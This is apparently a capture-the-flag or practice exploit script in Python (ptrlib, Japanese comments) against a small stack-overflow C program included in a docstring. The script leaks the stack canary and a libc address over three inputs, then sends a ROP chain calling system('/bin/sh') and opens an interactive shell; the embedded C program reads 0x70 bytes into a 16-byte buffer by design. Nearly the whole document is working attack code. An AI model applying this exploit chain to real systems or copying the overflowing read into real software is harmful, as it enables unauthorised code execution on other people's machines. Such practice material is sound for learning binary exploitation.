from ptrlib import *

# canaryのリーク
def canary_leak(elf, proc):
    payload = b'P' * 0x18
    payload += b'P' # カナリー一歩手前
    proc.sendafter("Input (1/3) >> ", payload)
    proc.recv(len("Output : ") + len(payload)) # ゴミ
    leaked = proc.recv(7)
    leaked_canary = int.from_bytes(leaked, byteorder='little')
    return (leaked_canary * 0x100)


def libc_leak(elf, proc) -> int:
    payload = b''
    payload += b'Q' * 8 * 5
    proc.sendafter("Input (2/3) >> ", payload)
    proc.recv(len("Output : ") + len(payload))
    leaked = proc.recv(6)
    leaked_libc_start_main = int.from_bytes(leaked, byteorder='little')
    return (leaked_libc_start_main)


def exec_libc_system_function(libc_elf, proc, leaked_canary:int):
    payload = b'P' * 0x18
    payload += p64(leaked_canary)
    payload += b'P' * 8 # saved rbp 
    payload += p64(next(libc_elf.gadget("ret"))) # アラインメント問題の解決用
    payload += p64(next(libc_elf.gadget("pop rdi; ret")))
    payload += p64(next(libc_elf.find("/bin/sh")))
    payload += p64(libc_elf.symbol("system"))
    proc.sendafter("Input (3/3) >> ", payload)
    


"""
<< EOF cat |  gcc -o medium -x c -
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char msg[0x10] = {};

    setbuf(stdout, NULL);

    puts("You can put message 3 times");
    for (int i = 0; i < 3; i++) {
        printf("Input (%d/3) >> ", i + 1);
        read(STDIN_FILENO, msg, 0x70);
        printf("Output : %s\n", msg);
    }
    puts("Bye!");

    return 0;
}
// gcc medium.c -o medium
EOF
"""
def main():
    elf = ELF("./medium")
    proc = Process("./medium")

    libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6") # ldd chall_vulnfunc
    input()
    leaked_canary = canary_leak(elf, proc)
    print("leaked_canary:".ljust(40), hex(leaked_canary))
    leaked_libc_call_main = libc_leak(elf, proc) - 0x7a
    print("leaked \"__libc_start_call_main\":".ljust(40), hex(leaked_libc_call_main))
    offset_libc_call_main = libc_elf.symbol("__libc_start_call_main")
    libc_elf.base = leaked_libc_call_main - offset_libc_call_main 
    print("leaked libc \"system\" function addr:".ljust(40) , hex(libc_elf.symbol("system")))
    exec_libc_system_function(libc_elf, proc, leaked_canary)
    print("start shell...")
    proc.interactive()


if __name__ == "__main__":
    main()
